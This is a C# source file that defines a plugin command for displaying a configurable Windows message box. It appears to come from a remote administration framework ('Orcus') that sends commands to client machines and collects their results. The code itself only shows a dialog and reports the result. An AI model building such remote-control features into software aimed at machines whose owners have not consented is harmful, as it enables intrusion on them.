using System;
using System.Windows.Forms;
using Orcus.Plugins;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Utilities;

namespace Orcus.StaticCommands.Interaction
{
    public class ShowMessageBoxCommand : StaticCommand
    {
        public ShowMessageBoxCommand()
        {
            this.RegisterProperty(() => Text, Resources.StaticCommands.Text,
                Resources.StaticCommands.Interaction_ShowMessageBoxCommand_Text_Description, Resources.StaticCommands.Common)
                .RegisterProperty(() => Title, Resources.StaticCommands.Title, Resources.StaticCommands.Interaction_ShowMessageBoxCommand_Title_Description,
                    Resources.StaticCommands.Common)
                .RegisterProperty(() => MessageBoxButtons, Resources.StaticCommands.Interaction_ShowMessageBoxCommand_Buttons,
                    Resources.StaticCommands.Interaction_ShowMessageBoxCommand_Buttons_Description, Resources.StaticCommands.Common)
                .RegisterProperty(() => Icon, Resources.StaticCommands.Icon, Resources.StaticCommands.Interaction_ShowMessageBoxCommand_Icon_Description, Resources.StaticCommands.Common)
                .RegisterProperty(() => DefaultButton, Resources.StaticCommands.Interaction_ShowMessageBoxCommand_DefaultButton,
                    Resources.StaticCommands.Interaction_ShowMessageBoxCommand_DefaultButton_Description, Resources.StaticCommands.Advanced);
        }

        public override Guid CommandId { get; } = new Guid(0x5374617b, 0x9cba, 0xef4c, 0xab, 0x60, 0x97, 0x61, 0xda,
            0x05, 0x8e, 0x37);

        public override string Name { get; } = Resources.StaticCommands.Interaction_ShowMessageBoxCommand_Name;
        public override string Description { get; } = Resources.StaticCommands.Interaction_ShowMessageBoxCommand_Description;
        public override StaticCommandCategory Category { get; } = StaticCommandCategory.UserInteraction;

        public string Text { get; set; }
        public string Title { get; set; }
        public MessageBoxButtons MessageBoxButtons { get; set; } = MessageBoxButtons.OK;
        public MessageBoxIcon Icon { get; set; } = MessageBoxIcon.None;
        public MessageBoxDefaultButton DefaultButton { get; set; } = MessageBoxDefaultButton.Button1;

        public override InputValidationResult ValidateInput()
        {
            if (Text.IsNullOrWhiteSpace())
                return InputValidationResult.Error(Resources.StaticCommands.ShowMessageBoxCommand_ValidateInput_TextCannotBeEmpty);

            return InputValidationResult.Successful;
        }

        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory,
            IClientInfo clientInfo)
        {
            commandParameter.InitializeProperties(this);

            var result = MessageBox.Show(Text, Title, MessageBoxButtons, Icon, DefaultButton);
            feedbackFactory.Succeeded("Message box successfully opened. Result: " + result);
        }
    }
}